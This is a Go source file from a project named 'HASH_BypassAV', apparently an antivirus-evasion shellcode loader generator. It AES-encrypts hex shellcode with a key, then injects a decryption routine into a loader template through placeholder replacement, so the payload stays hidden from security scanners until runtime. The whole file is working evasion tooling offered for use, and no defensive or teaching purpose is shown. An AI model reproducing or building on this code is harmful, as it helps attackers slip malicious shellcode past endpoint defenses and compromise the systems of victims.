package encrypt

import (
	"HASH_BypassAV/log"
	"encoding/hex"
	"strings"
)

// Encryptor为需要秘钥的加、解密器
type Encryptor interface {
	Encrypt([]byte, []byte) ([]byte, error)
	Decrypt([]byte, []byte) ([]byte, error)
}

func LoadEncryptors() map[string]Encryptor {
	container := make(map[string]Encryptor, 5)

	// 所有的加密模块都添加到这（好不优雅
	// 命名为文件名(均为大写)
	container["AES"] = new(AES)

	return container
}

func DecryptReplace(template, enc, key string) (temp string) {
	log.Info("use enryptor: %s", enc)
	log.Info("encrypt/%s.go", enc)
	temp = template
	temp = strings.ReplaceAll(temp, "//__ENCRYPTMODULE__", "\"HASH_BypassAV/encrypt\"")
	temp = strings.ReplaceAll(temp, "//__ENCRYPTCODE__", "_shellcode, _ := encrypt."+enc+"{}.Decrypt(shellcode, []byte(\""+key+"\"))\n    shellcode = _shellcode")
	return
}

func EncryptShellcode(shellcode, enc, key string) (finshellcode []byte, ok bool) {
	encryptors := LoadEncryptors()
	binShellCode, _ := hex.DecodeString(shellcode)
	encyptor, ok := encryptors[enc]
	if !ok {
		println("Encryptor", enc, "not exist!")
		return nil, false
	}
	finshellcode, err := encyptor.Encrypt(binShellCode, []byte(key))
	if err != nil {
		println("encrypt error:", err.Error())
		return finshellcode, false
	}
	return
}
